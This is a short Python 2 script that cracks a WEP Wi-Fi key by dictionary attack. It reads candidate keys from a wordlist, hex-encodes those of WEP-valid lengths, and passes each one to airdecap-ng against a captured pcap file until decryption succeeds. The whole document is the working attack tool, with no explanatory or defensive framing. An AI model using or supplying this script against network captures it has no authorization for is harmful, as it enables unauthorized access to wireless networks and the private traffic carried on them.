import sys, binascii, re
from subprocess import Popen, PIPE

def brute_WEP_from_dic(dictionary,WEPFile):
	key_count = 0
	dictionary = open(dictionary, 'r')
	for line in dictionary:
		key = re.sub(r'\W', '', line)
		hexkey = binascii.hexlify(key)
		if len(key) == 5 or len(key) == 13 or len(key) == 16 or len(key) == 29 or len(key) == 61:
			try:
				key_count = key_count + 1
				p = Popen(['airdecap-ng', '-w', hexkey, WEPFile], stdout=PIPE)
				output = p.stdout.read()
				result = output.split('\n')[4]
				if key_count % 1000 == 0:
					print "try: " + str(key_count) + " keys" 
					print "[+] Trying WEP Key: "+key+" in Hex: "+hexkey + " len: " + str(len(key))
					print result
				if(result.find('1') != -1) :
					print "[+] WEP Key found!!!: "+key
					return key
					break
			except Exception as e:
				# error will occure when it cannot decrypt and index out of range
				pass

	print "[-] WEP Key is Not found"
	return "-- No KEY FOUND! --"

wepkey = brute_WEP_from_dic("alphaNumeric.txt","file.pcap")
print "Key found: " + str(wepkey)